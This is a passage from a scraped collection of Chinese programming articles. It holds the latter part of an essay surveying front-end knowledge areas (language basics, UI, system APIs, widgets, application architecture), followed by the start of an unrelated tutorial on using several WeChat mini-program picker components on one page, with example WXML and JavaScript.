<p>任何一门编程语言的学习都需要从基本的表达式（Expression）语法开始学习，我们需要了解如何去声明与使用变量、如何为这些变量赋值、如何使用运算符进行简单的变量操作等等。在很多语言之中都有所谓的传值还是传引用的思量，譬如 Java 与 JavaScript 本质上就是 Pass-by-Value 的语言，只不过会将复杂对象的引用值传递给目标变量。这个特性又引发了所谓浅复制与深复制、如何进行复合类型深拷贝等等需要注意的技术点。除此之外，作用域与闭包也是很多语言学习中重点讨论的内容，在 JavaScript 与 Python 的学习中我们就会经常讨论如何利用闭包来保存外部变量，或者在循环中避免闭包带来的意外变量值。表达式是一门编程语言语法基础的重要组成部分，接下来我们就需要去学习流程控制与异常处理、函数定义与调用、类与对象、输入输出流、模块等内容。流程控制的典型代表就是分支选择与循环，譬如不同的语言都为我们提供了基础 for 循环或者更方便地 for-in 循环，而在 JavaScript 中我们还可以使用 forEach 与 for-of 循环，Java 8 之后我们也可以基于 Stream API 中的 forEach 编写声明式地循环执行体，而 Python 中的列表推导也可以看做便捷的循环实现方式。异常处理也是各个编程语言的重要组成部分，合理的异常处理有助于增强应用的鲁棒性；不过很多时候会出现滥用异常的情况，我们只是一层一层地抛出而并未真正地去处理或者利用这些异常。Java 中将异常分为了受控异常与不受控异常这两类，虽然 JavaScript 等语言中并未在数据类型中有所区分，但是却可以引入这种分类方式来进行不同的异常处理；有时候 Let it Crash 也是不错的设计模式。</p>
<p>Eric Elliott 曾在博文中提及，软件开发实际就是 Function Composition 与 DataStructure Design；函数或者方法是软件系统的重要基石与组成。我们需要了解如何去定义函数，包括匿名函数以及 Lambda 表达式等；尽管 Java 中的 Lambda 表达式是对于 FunctionalInterface 的实现，但是鉴于其表现形式我们也可以将其划归到函数这个知识类别中。接下来我们需要了解如何定义与传入函数参数，在 C 这样的语言中我们会去关心指针传递的不同姿势；而在 JavaScript 中我们常常会关心如何设置默认参数，无论是使用对象解构还是可选参数，都各有利弊。Objective-C 与 Swift 中提供的外部参数就是不错的函数自描述，Java 或 Python 中提供的不定参数也能够帮我们更灵活地定义参数，在 JavaScript 中我们则可以通过扩展操作符实现类似的效果。然后我们就需要去考虑如何调用函数，最典型就是就是 JavaScript 中函数调用的四种方式，我们还需要去关心调用时函数内部的 this 指针指向。而装饰器或者注解能帮我们更好地组织代码，以类似于高阶函数的方式如洋葱圈般一层一层地剥离与抽象业务逻辑。最后在函数这部分我们还需要关心下迭代器与生成器，它们是不错的异步实现模式或者流数据构建工具。</p>
<p>近几年随着前端富客户端应用的迅猛发展与服务端并发编程的深入应用，函数式编程以及 Haskell 这样的函数式编程语言也是引领风骚。尽管面向对象编程也有着很多其他被人诟病的地方，但是在大型复杂业务逻辑的应用开发中我们还是会倾向使用面向对象编程的范式；这就要求我们对于类与对象的基本语法有所掌握。我们首先要去了解如何定义类，定义类的属性、方法以及使用访问修饰符等方式进行访问控制。其次我们需要了解如何从类中实例化出对象，如何在具体的语言中实践单例模式等。然后我们就需要去了解面向对象的继承与多态的特性，应该如何实现类继承，子类与父类在静态属性、静态方法、类属性、构造函数上的调用顺序是怎样的；以及如何利用纯虚函数、抽象类、接口、协议这些不同的关键字在具体语言中实现多态与约定。最后我们还需要去关注下语言是否支持内部类，譬如 Java 就分为了静态内部类、成员内部类、局部内部类与匿名内部类这四种不同的分类。在整个语法基础部分的最后，我们还需要去了解下输入输出流与模块化相关的知识，譬如 Java 9 中即将推出 JPMS 模块化系统，而 JavaScript 的模块化标准则历经了 CommonJS、AMD、UMD、ES6 Modules 等多轮变迁。</p>
<h2>数据结构与功能</h2>
<p>语法基础是我们掌握某门编程语言的敲门砖，而学习内建的数据结构与功能语法则是能够用该语言进行实际应用开发的重要前提。在数据结构的学习中我们首先要对该语言内建的数据类型有所概览，我们要了解如何进行常见的类型与值判断以及类型间转换；譬如如何进行引用与值的等价性判断、如何进行动态类型检查、如何对复合对象的常用属性进行判断等等。很多编程语言中会将数据类型划分为原始类型（Primitive）与复合类型（Composite），不过这里为了保证通用性还是将学习复杂度较低的数据类型划归到基本类型中。常见的基本类型囊括了数值类型、空类型、布尔类型、可选类型（Optional）以及枚举类型（Enum）等等。学习数值类型的时候我们还需要了解如何进行随机数生成、如何进行常见的科学计算，这也是基础的数值理论算法的重要组成。JavaScript 中提供了 undefined 与 null 两个关键字，二者都可以认为是空类型不过又有所区别；而可选类型则能够帮我们更好地处理可能为空地对象，避免很多的运行时错误。接下来我们就要将目光投注于字符串类型上，我们需要了解如何创建、删除、复制、替换某个字符串或者其他内容；很多语言也提供了模板字符串或者格式化字符串的方式来创建新字符串。我们还需要知道如何对字符串进行索引遍历，如何对字符串进行常见的类型编码以及如何实践模式匹配。模式匹配中最直接的方式就是使用正则表达式，这也是我们应用开发中经常会使用到的技术点。除此之外我们还需要关注字符串校验、以及如何进行高效模糊搜索等等内容；我们也可以学习使用 KMP、Sunday 等常见的模式匹配算法来处理搜索问题。</p>
<p>然后我们需要学习常见的时间与日期处理方式，了解如何时间戳、时区、RFC2822、ISO8601 这些基础的时间与日期相关的概念，了解如何从时间戳或者时间字符串中解析出当前编程语言支持的时间与日期对象。我们还需要了解时区转换、时间比较以及如何格式化地展示时间等内容，有时候我们还需要利用日历等对象进行事件的增减以及偏移计算。接下来就是非常重要的集合类型，无论哪种编程语言都会提供类似于 Array、List、Set、Dictionary、Map 等相关的数据结构实现，而我们也就需要去了解这些常见集合类型中的增删复替以及索引遍历这些基础操作以及每个集合的特点；譬如对于序列类型我们要能熟练使用 map、reduce、filter、sort 这些常见的变换进行序列变换与生成。进阶而言的话我们可以多了解下这些数据结构的底层算法实现，譬如 Java 8 中对于 HashMap 的链表/红黑树实现，或者 V8 中是如何利用 Hidden Class 进行快速索引的。接下来的话我们可以对于像 Java 中 SteamAPI 或者各种语言的 Immutable 对象的实现方式有所了解，还有就是常见的 JSON、XML、CSV 这些类型的序列化与反序列化操作库也是实际开发中经常用到的。</p>
<p>接下来我们就需要对语言提供的常用外部功能相关的 API 或者语法有所掌握，主要也是分为存储、网络与系统进程这三个部分。在存储部分我们需要掌握如何与 MySQL、Redis、Mongodb 等关系型或者非关系型数据库进行数据交互，掌握如何对文件系统进行如文件寻址、文件监控等操作，并且还需要能够使用一些譬如 Java 堆外存储这样的应用内缓存来存放数据。而网络部分我们应该掌握如何利用 HTTP 客户端进行网络交互、如何使用相对底层的 Socket 套接字建立 TCP 连接、或者使用语言内置的一些远程调用框架与远端服务进行交互。最后我们需要对如何利用语言进行系统进程操作有所了解，本部分笔者认为最重要的当属并发编程相关知识。在而今服务器性能不断提升、处理的数据量越来越多的情况下，我们不可避免地需要使用并发操作来提高应用吞吐量。并发编程领域我们应该去学习如何使用线程、线程池或者协程来实现并发，如何利用锁、事务等方式进行并发控制并保持数据一致性，如何使用回调、Promise、Generator、Async/Await 等异步编程模式。除此之外，我们还需要对切面编程、系统调用以及本地跨语言调用有所了解。</p>
<h2>工程实践与进阶</h2>
<p>编程语言初学阶段的最后我们需要了解下工程实践以及一些偏原理与底层实现的进阶内容。首先开发者应当对具体编程语言中如何实现 S.O.L.I.D 编程原则与数十种设计模式有所了解，当然也不能邯郸学步只求形似，而是能够根据业务功能需求灵活地选择适用的范式。而在团队开发中我们往往还需要统一团队内的样式指南，包括代码风格约定中常见的命名约定、文档与注释约定、项目与模块的目录架构以及语法检查规范等。接下来我们还需要对语言或者常用开发工具的调试方式有所了解，掌握基本的单步调试等技巧，并且能够为代码编写合适的单元测试用例。工程实践方面的最后则是要求我们对代码性能优化所有了解，尽量避免反模式。<br>进阶内容的话则相对更加地抽象或者需要花费更多的精力去学习，其中包括泛型编程、元编程、函数式编程、响应式编程、内存管理、数据结构与算法等几个部分。泛型编程与元编程中的反射、代码生成、依赖注入等还是属于语言本身提供的语法特性之一，而函数式编程与响应式编程则偏向于实际应用开发中有所偏爱的开发范式。即使 Java 这样纯粹的面向对象的语言，当我们借鉴纯函数、不可变对象、高阶函数、Monad 等函数式编程中常见的名词时，也能为代码优化开辟新的思路。响应式编程是非常不错的异步编程范式，这里我们还需要注意下并发编程与异步编程之间的差异。而内存管理则有助于我们理解编程语言运行地底层机制，譬如对于 JVM 或者 V8 的内存结构、内存分配、垃圾回收机制有所了解的话能够反过来有助于我们编写高性能地应用程序，并且对于线上应用错误的调试也能更加得心应手。</p>
<h1>界面基础</h1>
<p>用户界面是前端应用程序的核心组成部分，而我们涉足前端开发的第一步往往也就是从简单的界面搭建开始。我们可能是在 Android 中编写简单的基于 XML 布局的 Activity，在 iOS 中利用 StoryBoard 快速构建导航界面，或者在 Web 中使用某个框架实现 TODOList。而界面开发最基础的部分就是布局与定位，无论在何端开发中我们往往都会使用相对布局、绝对布局、弹性布局、网格布局等布局方式；并且面向多尺寸的屏幕我们往往也需要进行响应式布局的考虑，从横竖屏响应式切换到不同分辨率下的布局与尺寸的调整，都是为了给予用户较好的使用体验。而了解了布局与定位之后，我们往往就需要来学习如何使用基本的界面容器，譬如常见的滚动视图、导航视图、页卡视图与伸缩视图。Android 与 iOS 往往也为我们对这些基本容器进行了较好地封装，而 Web 中则往往需要我们自己动手去实现相应功能。譬如在滚动视图中，我们需要去提供常见的滚动事件控制，典型的有如何在不同环境下保证平滑滚动体验、如何设置优美的滚动条、如何设置滚动监听等等。除此之外，我们往往还需要针对列表或者长阅读界面封装一些高级事件响应，譬如上拉加载、下拉刷新以及无限滚动时需要的滚动触发规则实现。作为最常见的用户交互方式之一，无论是在移动端还是桌面端，我们也都需要实现一些优美的动画；譬如视差滚动就可以给用户带来不一样的视觉感受，而像 Swiper 这样的整页滚动则是很好地产品展示或者讲演页的交互方式。<br>在基础的界面容器使用中我们已经接触了一些用户交互的监听与响应的实现，接下来我们则是需要深入全面地了解用户交互相关内容。最基础的我们需要了解常用事件与手势操作，了解如何进行事件监听与绑定、如何捕获事件并且进行分发、如何进行缩放、拖拽、摇晃等复杂手势动作地监听与识别、如何响应键盘事件并且进行响应处理。除此之外，笔者将音视频录制与播放，指纹、计步器等传感器的使用，本地通知与远程推送等内容也都归纳于了用户交互这个分类下。在 Android 与 iOS 开发中相信对于这些 API 的使用并不会陌生，而随着 HTML5 的流行以及现代浏览器的发展，相信未来 Web 应用也会越来越多地添加这些与系统层面进行交互地功能。我们在本部分还需要了解下动画与变换、绘图及数据可视化等相关内容。常见的动画引擎包含了属性控制与帧动画两种方式，前者更趋向于命令式编程而后者则适用于声明式编程；除了了解这些基础的语法，我们还需要对常用的动画进行收集与汇总，以便在项目开发中能够灵活应用。而随着大数据时代的到来，数据可视化相关应用也成了前端开发常见的任务之一。在这个部分，我们需要对 SVG、Canvas、WebGL 等相关绘画基础有所了解，能够运用 D3.js 或者其他类似的库进行简单图形绘制。并且我们要能够利用 ECharts 等优秀的外部绘图库进行散点图、折线图、流程图等常见类型图表进行绘制。最后，地图以及相关技术也是我们需要去了解的，作为开发者我们要能够基于百度地图等第三方 API 或者 SDK 开发导航、地理位置信息可视化等相关的功能。</p>
<h1>系统功能</h1>
<p>与界面基础相对的就是常见的系统功能以及 API 的使用语法，其主要分为系统与进程、数据存储以及网络交互这三个部分。</p>
<h2>进程与存储</h2>
<p>在开发多界面应用程序或者利用 Service、ServiceWorker 等方式启动后台线程时，我们就需要考虑如何进行组件间通信；譬如在 Android 开发中我们可以利用 Otto 等库以消息总线的方式在 Activity、Fragment、Service 等组件之间传递消息。而在 Android 或者 iOS 开发中我们也常常需要考虑并发编程，可能会涉及到如何利用 Thread、GCD 等方式实现多线程并行、如何利用 RxJava 等响应式扩展优化异步编程模型、如何利用锁等同步方式进行并发控制等等内容。有时候我们也需要去更多地了解系统服务相关的内容，特别是在 Android 或者桌面应用程序开发时，我们需要考虑如何实现守护进程以协调并且保障各个组件的正常运行。在系统与进程部分的最后，我们还需要去接触些系统辅助相关的功能实现，譬如如何进行运行环境检测、如何利用 DeepLink 进行 APP 之间跳转、如何进行应用的权限管理等等。接下来我们讨论下数据存储部分应该掌握哪些内容，最简单的就是类似于 SharedPreference、NSUserDefaults、localStorage 这样的键值类存储；复杂一点的情况我们可能会利用到 SQLite 或者 IndexedDB 这样的简化关系型或者文档型数据库，有时候 Realm 这样的第三方解决方案也是不错的选择。很多时候我们还需要了解如何控制缓存或者剪贴板中的内容，以及如何对文件系统进行基本的操作，譬如读写配置文件与资源文件、浏览列举文件系统中的文件并且根据不同的文件类型选用不同的处理方式。</p>
<h2>网络交互</h2>
<p>而网络交互部分更多地关注如何与服务端或者第三方系统进行交互，实际上对于如何在需求动态变化的情况下较好地协调服务端与客户端对于接口的定义是很多项目开发的痛点。不过从基础使用的角度，我们首先需要了解如何利用网络客户端进行基于 HTTP 或 HTTPS 的网络请求。这部分我们需要了解如何构造、分析、编码 URI，如何管理请求头、设置请求方法与请求参数，如何同步、异步或者并发地执行请求，如何进行响应解析，如何进行复杂的请求管理等等内容。除了这些，我们还要能够利用基础的 Socket 进行通信，这样有助于我们理解通信网络与 TCP/IP 实现原理；我们往往还需要关心如何利用 WebSocket 等技术实现推送与长连接功能，如何进行远程与本地方法调用等等。除了这三个偏功能实现的知识点，我们还可以尝试去了解下系统的底层设计原理。譬如在 Android 开发中我们可以尝试去了解 Dalvik 虚拟机的工作原理，使用 Xposed 或类似工具进行系统层面的一些操作；对于 Web 开发而言我们可以去更多地关注浏览器工作原理，了解现代浏览器的运行机制等等内容。</p>
<h1>界面插件</h1>
<p>在掌握了如何构建基本的界面并且为应用添加必须的功能之后，我们就需要去尝试进行应用项目开发。每个应用可以按照用户交互地逻辑切分为多个独立界面，而每个界面的开发中我们往往又需要编写导航、菜单、列表、表单等等可重复使用的界面插件。实际上前端开发中最核心的工作之一就是界面插件的开发，好的开发者能够在项目开发中沉淀出可复用的界面插件库；这类可复用的界面插件往往会独立于具体的业务逻辑，其分类自然也应按照显示或者交互逻辑本身，而不应该受制于不同的业务场景。笔者习惯地会将界面插件区分为指示器（Indicator）、输入器（Picker）、列表与表单（TableGrid）、对话框（Dialog）、画廊（Galley）、WebView 等几个部分。</p>
<h2>指示器与输入器</h2>
<p>指示器与输入器算是两个宽泛的界面插件分类，最常见的指示器当属文本显示类别的插件，譬如标签。标签多用于表单中的输入域描述、用户引导等场景，而除了文字标签之外我们也会使用图标或者所谓的 Tags。除此之外我们还会关注于 MarkDown 等富文本的展示、如何针对不同屏幕对页面进行排版与字体设置、如何针对不同地区的用户进行国际化切换、如何为文本添加合适的动画等等方面。在应用开发中我们也会添加专门的介绍或引导页，一方面引导用户使用，另一方面也可以进行后台资源请求与处理；譬如我们往往会在应用启动时设置闪屏页（Splash），记得最早在 Uber 见到以短视频为背景的闪屏页很有耳目一新的感觉。除此之外，我们常见的指示器还包括了进度指示与时间指示这两种。在进行数据请求或者数据处理等需要用户等待的场景中，我们往往会给用户以进度条方式地友好反馈，这种进度条就是典型地进度指示。常用的进度条设计有线性进度条、圆形进度条或者固定在页首或者页尾的进度条，有些设计中我们也会以背景投射地方式反馈当前进度，这种方式可能更具有视觉冲击力。而除了进度条之外，无限循环的加载效果、分页器或者步骤跟踪显示器也是常见的进度指示的表现形式之一。而所谓的时间指示即譬如界面上放置的拟物时钟或者电子时钟、常见于社交媒体上的时间轴或者日历效果以及倒计数效果等。</p>
<p>而输入器的典型代表则为按钮与文本输入，譬如我们除了常见的 Primary、Secondary 按钮之外，我们可能还会用到悬浮按钮、可扩展的按钮或者在喜欢与点赞时用到的具有一定动画效果的按钮。而文本输入系列的插件中，除了常见的文本框或者富文本编辑器，有时我们也需要去编写具有自动补全或者类似于密码、勾选之类的特殊格式的输入框。选择器也是我们常用到的输入器之一，譬如开关、单选按钮、勾选按钮、分段输入以及常用于两个列表互选的左右穿梭器等等。除了这些，搜索、菜单、解锁界面也是归属于输入器这个类别中。</p>
<h2>列表、画廊与对话框</h2>
<p>在这两个大类之外算得上最常用的插件的当属列表、网格与表单这个系列的控件；基本上每个应用都会包含列表或者网格布局，对于海量数据的列表渲染也是前端常见的挑战之一。Android 中内置的 RecycleView 与 iOS 中内置的 UITableView 都为我们提供了不错的懒加载、局部渲染的功能，而 Web 中我们往往需要自己定制或者寻求第三方库的帮助。对于列表的交互也是常见问题之一，除了允许用户正常的点击，我们还需要添加左滑右滑时的反馈、可伸缩或者允许排序、拖拽的方式进行交互，有时候还需要为了列表项添加进出时的转场动画，以这种微互动增加整个界面的友好性。最后我们来聊聊画廊与对话框，画廊最典型的插件就是提供图片或者视频预览的走马灯效果的轮播插件，笔者也是将图片加载、呈现、处理相关的插件划分到了画廊这一系列插件中。而在端开发中我们常常需要对相册或者缓存中的图片进行浏览，或者将图片以瀑布流的方式呈现给用户，这种性质的插件也应归属到画廊这一类中。对话框的分类则稍显的有些生硬，譬如 ActionSheet、HUD 是系统提供的消息提示性质的插件，这种弹出与显示层自然会划归到对话框这个系列的组件中。而在 Web 中我们常常需要自定义的模态对话框、覆盖层也属于对话框系列，有时候我们还需要考虑如何为对话框提供拖拽支持，或者在对话框显示和消失之际添加转场动画。</p>
<h1>工程化与应用架构</h1>
<p>前面我们讨论了开发某个前端应用所需要的必备技能，而在需要持续交付的团队项目开发中，我们还需要考虑很多工程实践相关的方法与技巧。命令式编程到声明式编程的变化，将更多地功能性工作交于框架处理，而开发人员更加地专注于业务逻辑的实现。</p>
<h2>工程实践</h2>
<p>代码调试是每个程序员都掌握的技能，不过如何较好地调试代码以快速定位错误所在却并不是那么容易。在开发中我们常常需要热加载、增量编译等相关技术来避免过长的等待，而单步调试则能够帮助我们梳理代码逻辑、循序渐进地发现问题所在。可能 iOS、Android 的开发人员更习惯使用单步调试，而在 Web 或者 Node.js 开发中我们也应适当地多使用 Chrome 等工具进行代码的单步调试；有时候单步调试也是不错的浏览分析第三方源代码库的方式。另一方面，日志无论在开发环境还是生产环境中都能够帮我们记录应用运行状态等信息。接下来我们还要了解应用开发周期中不同阶段使用的单元测试、集成测试以及端到端测试的具体的实现方式，在团队协同开发中统一代码风格与约定，能够利用多种方式对应用进行性能优化，以及在发布到生产环境之后能够混淆加密、进行应用更新以及应用状态跟踪。</p>
<h2>应用架构</h2>
<p>所谓架构二字，核心即是对于对于富客户端的代码组织/职责划分，从具体的代码分割的角度，即是功能的模块化、界面的组件化、应用状态管理这三个方面。纵览这十年内的架构模式变迁，大概可以分为 MV<em> 与 Unidirectional 两大类，而 Clean Architecture 则是以严格的层次划分独辟蹊径。从笔者的认知来看，从 MVC 到 MVP 的变迁完成了对于 View 与 Model 的解耦合，改进了职责分配与可测试性。而从 MVP 到 MVVM，添加了 View 与 ViewModel 之间的数据绑定，使得 View 完全的无状态化。最后，整个从 MV</em> 到 Unidirectional 的变迁即是采用了消息队列式的数据流驱动的架构，并且以 Redux 为代表的方案将原本 MV* 中碎片化的状态管理变为了统一的状态管理，保证了状态的有序性与可回溯性。 实际上从 MVC、MVP 到 MVVM，一直围绕的核心问题就是如何分割 ViewLogic 与 View，即如何将负责界面展示的代码与负责业务逻辑的代码进行分割。所谓分久必合，合久必分，从笔者自我审视的角度，发现很有趣的一点。Android 与iOS中都是从早期的用代码进行组件添加与布局到专门的 XML/Nib/StoryBoard 文件进行布局，Android 中的 Annotation/DataBinding、iOS 中的 IBOutlet 更加地保证了 View 与 ViewLogic 的分割(这一点也是从元素操作到以数据流驱动的变迁，我们不需要再去编写大量的 findViewById。而Web的趋势正好有点相反，无论是 WebComponent 还是 ReactiveComponent 都是将 ViewLogic 与 View 置于一起，特别是 JSX 的语法将 JavaScript 与 HTML 混搭，颇有几分当年 PHP/JSP 与 HTML 混搭的风味。</p>
<p>从代码组织的角度来看，项目的构建工具与依赖管理工具会深刻地影响到代码组织，这一点在功能的模块化中尤其显著。譬如笔者对于 Android/Java 构建工具的使用变迁经历了从 Eclipse 到 Maven 再到 Gradle，笔者会将不同功能逻辑的代码封装到不同的相对独立的子项目中，这样就保证了子项目与主项目之间的一定隔离，方便了测试与代码维护。同样的，在 Web 开发中从 AMD/CMD 规范到标准的 ES6 模块与 Webpack 编译打包，也使得代码能够按照功能尽可能地解耦分割与避免冗余编码。而另一方面，依赖管理工具也极大地方便我们使用第三方的代码与发布自定义的依赖项，譬如 Web 中的 NPM 与 Bower，iOS 中的 CocoaPods 都是十分优秀的依赖发布与管理工具，使我们不需要去关心第三方依赖的具体实现细节即能够透明地引入使用。因此选择合适的项目构建工具与依赖管理工具也是好的GUI架构模式的重要因素之一。不过从应用程序架构的角度看，无论我们使用怎样的构建工具，都可以实现或者遵循某种架构模式，笔者认为二者之间也并没有必然的因果关系。而组件即是应用中用户交互界面的部分组成，组件可以通过组合封装成更高级的组件。组件可以被放入层次化的结构中，即可以是其他组件的父组件也可以是其他组件的子组件。根据上述的组件定义，笔者认为像 Activity 或者UIViewController 都不能算是组件，而像 ListView 或者 UITableView 可以看做典型的组件。 我们强调的是界面组件的Composable&amp;Reusable，即可组合性与可重用性。当我们一开始接触到 Android 或者 iOS 时，因为本身 SDK 的完善度与规范度较高，我们能够很多使用封装程度较高的组件；凡事都有双面性，这种较高程度的封装与规范统一的 API 方便了我们的开发，但是也限制了我们自定义的能力。同样的，因为 SDK 的限制，真正意义上可复用/组合的组件也是不多，譬如你不能将两个 ListView 再组合成一个新的ListView。在 React 中有所谓的 controller-view 的概念，即意味着某个 React 组件同时担负起 MVC 中 Controller 与 View 的责任，也就是 JSX 这种将负责 ViewLogic 的 JavaScript 代码与负责模板的 HTML 混编的方式。 <br>界面的组件化还包括一个重要的点就是路由，譬如 Android 中的 AndRouter、iOS中的 JLRoutes 都是集中式路由的解决方案，不过集中式路由在 Android 或者 iOS 中并没有大规模推广。iOS 中的 StoryBoard 倒是类似于一种集中式路由的方案，不过更偏向于以 UI 设计为核心。笔者认为这一点可能是因为 Android 或者 iOS 本身所有的代码都是存放于客户端本身，而 Web 中较传统的多页应用方式还需要用户跳转页面重新加载，而后在单页流行之后即不存在页面级别的跳转，因此在 Web 单页应用中集中式路由较为流行而 Android、iOS 中反而不流行。所谓可变的与不可预测的状态时软件开发中的万恶之源，我们尽可能地希望组件的无状态性，那么整个应用中的状态管理应该尽量地放置在所谓 High-Order Component 或者 Smart Component 中。在 React 以及 Flux 的概念流行之后，Stateless Component 的概念深入人心，不过其实对于 MVVM 中的 View，也是无状态的 View。通过双向数据绑定将界面上的某个元素与 ViewModel 中的变量相关联，笔者认为很类似于 HOC 模式中的 Container 与 Component 之间的关联。随着应用的界面与功能的扩展，状态管理会变得愈发混乱。</p>

                ", 大前端公共知识杂谈,1531971956,531,1,172,1,1,https://segmentfault.com/a/1190000009863045
60,1,0,6,"
                    
<h2>一、picker基本概念</h2>
<p>当然先看官方文档 <a href=""https://mp.weixin.qq.com/debug/wxadoc/dev/component/picker.html"" rel=""nofollow noreferrer"">picker</a>说明搞清楚基本概念<br>“从底部弹起的滚动选择器，现支持三种选择器，通过mode来区分，分别是普通选择器，时间选择器，日期选择器，默认是普通选择器。”<br>几个主要属性：<br><strong>range：</strong> 选取范围，数据类型为Array / Object Array，mode为 普通选择器 时，range 有效；<br><strong>value：</strong> value 的值表示选择了 range 中的第几个（下标从 0 开始），数据类型肯定是Number；<br><strong>bindchange：</strong> 绑定事件，value 改变时触发 change 事件，event.detail = {value: value}。</p>
<h2>二、遇到问题</h2>
<p>今天在同一个页面使用多个普通选择器遇到了问题，选择一个选项，其他选项也跟随着改变了.<br>代码如下:</p>
<pre><code>//picker.wxml：   
&lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项一&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange1"" value=""{{index}}"" range=""{{option1}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option1[index]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;
    &lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项二&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange1"" value=""{{index}}"" range=""{{option2}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option2[index]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;
    &lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项三&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange1"" value=""{{index}}"" range=""{{option3}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option3[index]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;

//picker.js
    Page({
    data: {
        index:0,//设置索引值默认为0
        option1: ['1', '2', '3','4','5'],
        option2: ['一', '二', '三','四','五'],
        option3: ['①', '②', '③','④','⑤'],
    },
    bindchange1:function (e) {
       // console.log('picker发送选择改变，携带值为', e.detail.value)
       // 设置这个携带值赋值给索引值index
       // 所以option1 ,option2 ,option3的索引值都是一样的
        this.setData({
            index: e.detail.value
        })
    }
})</code></pre>
<p>因为默认索引值（也叫“下标”）都是index，绑定事件也只是改变了index。所以改变一个选项，其他选项都跟着改变了。</p>
<h2>三、怎么解决呢？</h2>
<p><strong>首先想到的是给三个选项自定义不同的索引值index1,index2,index3，分别绑定不同的事件bindchange1，bindchange2，bindchange3改变其对应的索引值，互不干扰。</strong><br>代码如下：</p>
<pre><code>//picker.wxml： 
 &lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项一&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange1"" value=""{{index1}}"" range=""{{option1}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option1[index1]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;
    &lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项二&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange2"" value=""{{index2}}"" range=""{{option2}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option2[index2]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;
    &lt;view class=""column_list"" &gt;
        &lt;text class=""font15""&gt;选项三&lt;/text&gt;
        &lt;picker class=""inputText"" bindchange=""bindchange3"" value=""{{index3}}"" range=""{{option3}}""&gt;
            &lt;view class=""select_picker""&gt;
                {{option3[index3]}}
                &lt;image  mode=""aspectFit""  class=""select_arrow"" src=""../../images/select_arrow.png""&gt;&lt;/image&gt;
            &lt;/view&gt;
        &lt;/picker&gt;
    &lt;/view&gt;
    // picker.js
    Page({
    data: {
        index1:0,
        index2:0,
        index3:0,
        option1: ['1', '2', '3','4','5'],
        option2: ['一', '二', '三','四','五'],
        option3: ['①', '②', '③','④','⑤'],
    },
    bindchange1:function (e) {
        this.setData({
            index1: e.detail.value
        })
    },
    bindchange2:function (e) {
        this.setData({
            index2: e.detail.value
        })
    },
    bindchange3:function (e) {
        this.setData({
            index3: e.detail.value
        })
    }

})</code></pre>
<p>这样，一个页面使用多个picker的问题就解决了。但在发现小一个问题。<br>搜索到<a href=""https://segmentfault.com/u/jiong_59250fe2e6dd3"" rel=""nofollow noreferrer"">jiong</a>也提出了这个问题：<br>“为什么多个picker会出现相互影响的问题？比如在第一个选择器选择了3，剩下的选择器点进去默认都是从第3个开始？”<br>小程序开发工具（PC端）中的确存在，也没有好的解决办法。<br><code>但是，我用手机亲测不存在这个问题。新版小程序开发工具已经修复此Bug</code></p>
<h2>四、延伸思考</h2>
<p>在这里我多次使用了picker，于是我想到了使用循环 <strong>wx:for</strong>，（以后如果还要用可以做成一个模板）<br>那么数据就要修改为对象的数组（Object Array） ，我理解为json格式（不知道对不对）</p>
<h3>picker.js</h3>
<pre><code>// picker.js
Page({
    data: {
    //每个对象就是一个选择器，有自己的索引值index，标题title，选项option（又是一个数组）
        objArray:[
            {
                index:0,
                title:'选项一',
                option: ['1', '2', '3','4','5'],
            },
            {
                index:0,
                title:'选项二',
                option: ['一', '二', '三','四','五'],
            },
            {
                index:0,
                title:'选项三',
                option: ['①', '②', '③','④','⑤']
            },
        ]
    },
    // 绑定事件，因为不能用this.setData直接设置每个对象的索引值index。
    // 所以用自定义属性current来标记每个数组对象的下标
    bindChange_select: function(ev) {
    // 定义一个变量curindex 储存触发事件的数组对象的下标
        const curindex = ev.target.dataset.current
    // 根据下标 改变该数组对象中的index值
        this.data.objArray[curindex].index = ev.detail.value
    // 把改变某个数组对象index值之后的全新objArray重新 赋值给objArray
        this.setData({
            objArray: this.data.objArray
        })
    }
})</code></pre>
<h3>picker.wxml</h3>
<p>wx:for绑定数组objArray,当前项的下标变量名默认为index，数组当前项的变量名默认为item，为了区分选项option中的下标<br>使用 wx:for-item 可以指定数组当前元素的变量名为itm，<br>使用 wx:for-index 可以指定数组当前下标的变量名为idx<br><strong>关键点是：自定义一个属性对应当前下标 data-current=""{{idx}}""，绑定事件bindChange_select触发时判断出是哪个数组对象触发的，就改变该数组对象中的index值</strong></p>
<pre><code>//picker.wxml：
 &lt;view class=""column_list mt_10"" wx:for=""{{objArray}}"" wx:for-item=""itm""  wx:for-index=""idx"" &gt;
        &lt;text class=""font15""&gt;{{itm.title}} &lt;/text&gt;
        &lt;picker  class=""inputText""  bindchange=""bindChange_select"" value=""{{itm.index}}"" data-current=""{{idx}}"" range=""{{itm.option}}"" &gt;
            &lt;view class=""select_picker""&gt;
                 {{itm.option[itm.index]}}
